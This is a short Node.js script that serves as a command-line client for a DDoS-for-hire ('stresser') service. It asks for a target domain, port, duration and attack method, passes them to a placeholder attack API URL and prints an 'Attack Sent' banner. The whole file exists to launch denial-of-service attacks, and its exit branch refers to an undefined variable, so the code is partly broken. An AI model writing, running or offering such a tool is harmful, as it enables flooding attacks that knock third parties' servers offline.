const input = require("prompt-sync")({ sigint: true });
const request = require("request");
const gradient = require("gradient-string");

function attack() {
    const host = input(gradient.teen(`[ INPUT ] Enter Target (Domain supported)> `));
    const port = input(gradient.teen(`[ INPUT ] Enter Port> `));
    const time = input(gradient.teen(`[ INPUT ] Enter Second (max: 100)> `));
    const method = input(gradient.teen(`[ INPUT ] Enter Methods> `));
    let API = `https://url/api?key=example&host=${host}&port=${port}&time=${time}&method=${method}`;

    request.get(API, (err, res, body) => {
        if (err) {
            return console.log(err);
        }
        console.clear();
        console.log(gradient.vice(`
╦═╗╔═╗╔═╗ ╦ ╦╔═╗╔═╗╔╦╗  ╔═╗╔═╗╔╗╔╔╦╗
╠╦╝║╣ ║═╬╗║ ║║╣ ╚═╗ ║   ╚═╗║╣ ║║║ ║║
╩╚═╚═╝╚═╝╚╚═╝╚═╝╚═╝ ╩   ╚═╝╚═╝╝╚╝═╩╝
    
 ╔═════════════════════════════════════════
╔╣ Attack Sent Information
║╚═════════════════════════════════════════
║ Target : ${host}
║ Port : ${port}
║ Time : ${time}
║ Methods : ${method}
╚══════════════════════════════════════════
                `));
        const back = input(gradient.teen(`[ INPUT ] Back to attack? (y/n)> `));
        console.clear();
        if (back.toLowerCase() == "yes" || back.toLowerCase() == "y") {
            attack()
        }
        else if (backtomain.toLowerCase() == "no" || backtomain.toLowerCase() == "n") {
            console.log(gradient.morning(`[ WARNING ] Closing the app...`));
            setTimeout(function () { process.exit(1); }, 3500);
        }
    });
}
attack()